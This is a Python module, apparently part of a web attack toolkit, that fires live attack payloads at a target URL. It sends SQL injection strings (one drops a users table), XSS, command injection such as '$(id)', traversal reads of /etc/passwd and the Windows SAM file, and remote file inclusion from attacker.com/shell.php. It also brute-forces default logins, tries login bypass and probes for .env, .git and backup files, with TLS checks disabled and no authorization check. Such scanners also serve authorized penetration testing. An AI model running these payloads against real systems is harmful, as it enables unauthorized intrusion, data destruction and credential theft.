#!/usr/bin/env python3
"""
Exploitation Module
Web vulnerability testing and exploitation
"""

import requests
import json
from dataclasses import dataclass, field
from datetime import datetime
from typing import List, Optional, Dict, Tuple
from urllib.parse import urljoin, quote
import re

@dataclass
class Vulnerability:
    """Vulnerability finding"""
    vuln_type: str  # SQLi, XSS, RCE, etc
    severity: str  # critical, high, medium, low
    url: str
    parameter: str = ""
    payload: str = ""
    response: str = ""
    cve: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

@dataclass
class ExploitationResult:
    """Exploitation attempt result"""
    target: str
    vulnerabilities: List[Vulnerability] = field(default_factory=list)
    successful_exploits: int = 0
    attempted_exploits: int = 0
    execution_time: float = 0.0

class ExploitationEngine:
    """Web vulnerability exploitation engine"""
    
    def __init__(self, timeout: float = 10.0):
        self.timeout = timeout
        self.session = requests.Session()
        self.vulnerabilities = []
        
    def test_sql_injection(self, url: str, params: Dict[str, str] = None) -> List[Vulnerability]:
        """Test for SQL injection vulnerabilities"""
        findings = []
        
        # SQL injection payloads
        payloads = {
            "basic": "' OR '1'='1",
            "union": "' UNION SELECT NULL--",
            "time_based": "'; WAITFOR DELAY '00:00:05'--",
            "error_based": "' AND 1=CONVERT(int, (SELECT @@version))--",
            "comments": "' OR 1=1--",
            "stacked": "'; DROP TABLE users--"
        }
        
        if params is None:
            params = {}
        
        for param_name, param_value in params.items():
            for payload_name, payload in payloads.items():
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(
                        url,
                        params=test_params,
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    # Basic detection patterns
                    if self._is_sqli_response(response.text):
                        findings.append(Vulnerability(
                            vuln_type="SQL Injection",
                            severity="critical",
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            response=response.text[:500]
                        ))
                except Exception:
                    pass
        
        return findings
    
    def test_xss(self, url: str, params: Dict[str, str] = None) -> List[Vulnerability]:
        """Test for Cross-Site Scripting (XSS)"""
        findings = []
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror='alert(1)'>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'>",
            "'\"><script>alert(1)</script>",
            "<body onload=alert('XSS')>"
        ]
        
        if params is None:
            params = {}
        
        for param_name, param_value in params.items():
            for payload in xss_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(
                        url,
                        params=test_params,
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    if payload in response.text:
                        findings.append(Vulnerability(
                            vuln_type="Cross-Site Scripting (XSS)",
                            severity="high",
                            url=url,
                            parameter=param_name,
                            payload=payload
                        ))
                except Exception:
                    pass
        
        return findings
    
    def test_command_injection(self, url: str, params: Dict[str, str] = None) -> List[Vulnerability]:
        """Test for command injection vulnerabilities"""
        findings = []
        
        payloads = {
            "unix": "; id",
            "windows": "& whoami",
            "pipe": "| whoami",
            "backtick": "`id`",
            "substitution": "$(id)"
        }
        
        if params is None:
            params = {}
        
        for param_name, param_value in params.items():
            for payload_name, payload in payloads.items():
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(
                        url,
                        params=test_params,
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    # Check for command output patterns
                    if self._is_rce_response(response.text):
                        findings.append(Vulnerability(
                            vuln_type="Command Injection (RCE)",
                            severity="critical",
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            response=response.text[:300]
                        ))
                except Exception:
                    pass
        
        return findings
    
    def test_lfi(self, base_url: str) -> List[Vulnerability]:
        """Test for Local File Inclusion"""
        findings = []
        
        lfi_payloads = [
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%252f..%252fetc%252fpasswd",
            "/etc/passwd",
            "file:///etc/passwd"
        ]
        
        for payload in lfi_payloads:
            for param in ["file", "page", "path", "include", "view"]:
                test_url = f"{base_url}?{param}={payload}"
                
                try:
                    response = self.session.get(
                        test_url,
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    if "root:" in response.text or "bin/bash" in response.text:
                        findings.append(Vulnerability(
                            vuln_type="Local File Inclusion (LFI)",
                            severity="high",
                            url=test_url,
                            parameter=param,
                            payload=payload
                        ))
                except Exception:
                    pass
        
        return findings
    
    def test_rfi(self, base_url: str) -> List[Vulnerability]:
        """Test for Remote File Inclusion"""
        findings = []
        
        payloads = [
            "http://attacker.com/shell.php",
            "http://attacker.com/shell.txt",
            "ftp://attacker.com/shell.php"
        ]
        
        for payload in payloads:
            for param in ["file", "page", "path", "include", "view"]:
                test_url = f"{base_url}?{param}={quote(payload)}"
                
                try:
                    response = self.session.get(
                        test_url,
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    # Look for evidence of inclusion attempt
                    if response.status_code in [200, 403]:
                        findings.append(Vulnerability(
                            vuln_type="Remote File Inclusion (RFI)",
                            severity="high",
                            url=test_url,
                            parameter=param,
                            payload=payload
                        ))
                except Exception:
                    pass
        
        return findings
    
    def test_default_credentials(self, url: str) -> List[Vulnerability]:
        """Test for default credentials"""
        findings = []
        
        common_creds = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("root", "root"),
            ("root", "password"),
            ("test", "test"),
            ("guest", "guest"),
            ("administrator", "password")
        ]
        
        for username, password in common_creds:
            try:
                response = self.session.post(
                    url,
                    data={"username": username, "password": password},
                    timeout=self.timeout,
                    verify=False
                )
                
                if "success" in response.text.lower() or response.status_code == 302:
                    findings.append(Vulnerability(
                        vuln_type="Default Credentials",
                        severity="critical",
                        url=url,
                        payload=f"{username}:{password}"
                    ))
            except Exception:
                pass
        
        return findings
    
    def test_authentication_bypass(self, login_url: str) -> List[Vulnerability]:
        """Test for authentication bypass"""
        findings = []
        
        payloads = [
            {"username": "admin' OR '1'='1", "password": "anything"},
            {"username": "admin' --", "password": ""},
            {"username": "' OR 1=1--", "password": ""},
            {"username": "admin", "password": "' OR '1'='1"},
            {"username": "*", "password": "*"}
        ]
        
        for payload in payloads:
            try:
                response = self.session.post(
                    login_url,
                    data=payload,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )
                
                # Check for bypass indicators
                if any(word in response.text.lower() for word in 
                       ["dashboard", "welcome", "logout", "home"]):
                    findings.append(Vulnerability(
                        vuln_type="Authentication Bypass",
                        severity="critical",
                        url=login_url,
                        payload=json.dumps(payload)
                    ))
            except Exception:
                pass
        
        return findings
    
    def test_path_traversal(self, base_url: str) -> List[Vulnerability]:
        """Test for path traversal vulnerabilities"""
        findings = []
        
        traversal_payloads = [
            "../../windows/win.ini",
            "../../etc/passwd",
            "....\\\\....\\\\windows\\\\system32\\\\config\\\\sam",
            "%2e%2e%2fetc%2fpasswd"
        ]
        
        for payload in traversal_payloads:
            test_url = f"{base_url}/{payload}"
            
            try:
                response = self.session.get(
                    test_url,
                    timeout=self.timeout,
                    verify=False
                )
                
                if response.status_code == 200 and len(response.text) > 100:
                    findings.append(Vulnerability(
                        vuln_type="Path Traversal",
                        severity="high",
                        url=test_url,
                        payload=payload
                    ))
            except Exception:
                pass
        
        return findings
    
    def _is_sqli_response(self, response_text: str) -> bool:
        """Detect SQL injection in response"""
        patterns = [
            r"SQL syntax",
            r"mysql_fetch",
            r"Warning.*mysql",
            r"PostgreSQL.*error",
            r"Oracle error",
            r"sqlite_",
            r"JDBC.*error"
        ]
        
        return any(re.search(pattern, response_text, re.IGNORECASE) for pattern in patterns)
    
    def _is_rce_response(self, response_text: str) -> bool:
        """Detect RCE in response"""
        patterns = [
            r"uid=\d+",
            r"root:x:0:0",
            r"Microsoft Windows",
            r"C:\\.*>",
            r"/bin/bash"
        ]
        
        return any(re.search(pattern, response_text) for pattern in patterns)
    
    def _test_common_paths(self, base_url: str, result: ExploitationResult):
        """Test for common directories and sensitive files"""
        common_paths = [
            # Admin panels
            "/admin", "/administrator", "/admin.php", "/wp-admin", "/phpmyadmin",
            "/cpanel", "/webmail", "/admin/login", "/admin/index.php",
            # Common directories
            "/uploads", "/images", "/files", "/backup", "/db", "/sql", "/temp", "/tmp",
            "/api", "/api/v1", "/api/v2", "/rest", "/graphql",
            # Config and sensitive files
            "/.env", "/config.php", "/configuration.php", "/settings.php",
            "/wp-config.php", "/web.config", "/.git/config", "/.git/HEAD",
            "/composer.json", "/package.json", "/.htaccess", "/robots.txt",
            # Backup files
            "/backup.sql", "/backup.zip", "/backup.tar.gz", "/dump.sql",
            "/database.sql", "/db.sql", "/site.zip", "/www.zip",
            # Common files
            "/phpinfo.php", "/info.php", "/test.php", "/shell.php",
            "/README.md", "/LICENSE", "/CHANGELOG",
        ]
        
        found_count = 0
        for path in common_paths:
            try:
                url = base_url.rstrip('/') + path
                response = self.session.get(url, timeout=5, verify=False, allow_redirects=False)
                
                # 200 = exists, 403 = forbidden (but exists), 401 = auth required (exists)
                if response.status_code in [200, 403, 401]:
                    severity = "high" if any(x in path for x in ['.env', 'config', 'backup', '.git', 'admin']) else "medium"
                    result.vulnerabilities.append(Vulnerability(
                        vuln_type="Information Disclosure",
                        severity=severity,
                        url=url,
                        parameter="path",
                        payload=path,
                        response=f"Status: {response.status_code}, Size: {len(response.content)} bytes"
                    ))
                    found_count += 1
                    if found_count <= 5:  # Don't spam output
                        from utils.helpers import print_success
                        print_success(f"[+] Found: {path} (HTTP {response.status_code})")
            except:
                pass
    
    def full_website_scan(self, target_url: str) -> ExploitationResult:
        """Perform comprehensive website scan"""
        from utils.helpers import print_info, print_success, print_warning
        import time
        
        result = ExploitationResult(target=target_url)
        start_time = time.time()
        
        try:
            # Parse URL for parameters
            print_info(f"[*] Scanning {target_url}...")
            
            # Directory and file discovery
            print_info("[*] Testing common paths and files...")
            self._test_common_paths(target_url, result)
            
            # Test main URL with various parameters
            test_params = {"id": "1", "search": "test", "page": "1", "file": "index", "cat": "1", "user": "admin"}
            
            # SQL Injection
            print_info("[*] Testing SQL Injection...")
            sqli = self.test_sql_injection(target_url, test_params)
            result.vulnerabilities.extend(sqli)
            result.attempted_exploits += 1
            if sqli:
                result.successful_exploits += 1
                print_success(f"[+] SQL Injection found: {len(sqli)} instances")
            
            # XSS
            print_info("[*] Testing XSS...")
            xss = self.test_xss(target_url, test_params)
            result.vulnerabilities.extend(xss)
            result.attempted_exploits += 1
            if xss:
                result.successful_exploits += 1
                print_success(f"[+] XSS found: {len(xss)} instances")
            
            # Command Injection
            print_info("[*] Testing Command Injection...")
            rce = self.test_command_injection(target_url, test_params)
            result.vulnerabilities.extend(rce)
            result.attempted_exploits += 1
            if rce:
                result.successful_exploits += 1
                print_success(f"[+] RCE found: {len(rce)} instances")
            
            # LFI
            print_info("[*] Testing LFI...")
            lfi = self.test_lfi(target_url)
            result.vulnerabilities.extend(lfi)
            result.attempted_exploits += 1
            if lfi:
                result.successful_exploits += 1
                print_success(f"[+] LFI found: {len(lfi)} instances")
            
            # Default Credentials
            print_info("[*] Testing Default Credentials...")
            creds = self.test_default_credentials(target_url)
            result.vulnerabilities.extend(creds)
            result.attempted_exploits += 1
            if creds:
                result.successful_exploits += 1
                print_success(f"[+] Default credentials found: {len(creds)} instances")
            
            result.execution_time = time.time() - start_time
            
        except Exception as e:
            print_warning(f"[!] Scan error: {e}")
        
        return result
